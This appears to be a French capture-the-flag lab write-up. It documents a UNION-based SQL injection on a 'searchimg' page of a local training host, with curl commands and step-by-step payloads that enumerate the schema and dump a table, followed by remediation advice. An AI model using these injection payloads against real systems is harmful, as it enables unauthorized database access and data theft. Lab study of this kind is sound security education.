curl -s "http://192.168.56.101/index.php?page=searchimg&id=1+UNION+SELECT+database(),null%23&Submit=Submit" | grep -i "pre\|title\|url"

curl -s "http://192.168.56.101/index.php?page=searchimg&id=1+UNION+SELECT+null,table_name+FROM+information_schema.tables+WHERE+table_schema=database()%23&Submit=Submit" | grep "Url"

curl -s "http://192.168.56.101/index.php?page=searchimg&id=1+UNION+SELECT+null,column_name+FROM+information_schema.columns+WHERE+table_name=0x6c6973745f696d61676573%23&Submit=Submit" | grep "Url\|Title"

curl -s "http://192.168.56.101/index.php?page=searchimg&id=1+UNION+SELECT+title,comment+FROM+list_images%23&Submit=Submit" | grep "Url\|Title"

SQL Injection - searchimg
==========================

URL vulnérable : http://192.168.56.101/index.php?page=searchimg&id=1&Submit=Submit

Le paramètre "id" est injectable via UNION-based SQL Injection.
Pas de message d'erreur visible — découvert en testant ORDER BY.

Exploitation étape par étape :

1. Détection du nombre de colonnes :
   id=1 ORDER BY 2#   → OK
   id=1 ORDER BY 3#   → aucun résultat = 2 colonnes

2. Nom de la base de données :
   id=1 UNION SELECT database(),null#
   → Member_images

3. Tables de la BDD :
   id=1 UNION SELECT null,table_name FROM information_schema.tables
        WHERE table_schema=database()#
   → list_images

4. Colonnes de list_images :
   id=1 UNION SELECT null,column_name FROM information_schema.columns
        WHERE table_name=0x6c6973745f696d61676573#
   → id, url, title, comment

5. Dump des données :
   id=1 UNION SELECT title,comment FROM list_images#
   → FLAG dans la colonne comment

Correction :
  - Utiliser des requêtes préparées (PDO/mysqli prepared statements)
  - Ne jamais interpoler directement les paramètres utilisateur dans le SQL
  - Valider et typer les entrées (id doit être un entier)

OWASP : A03 - Injection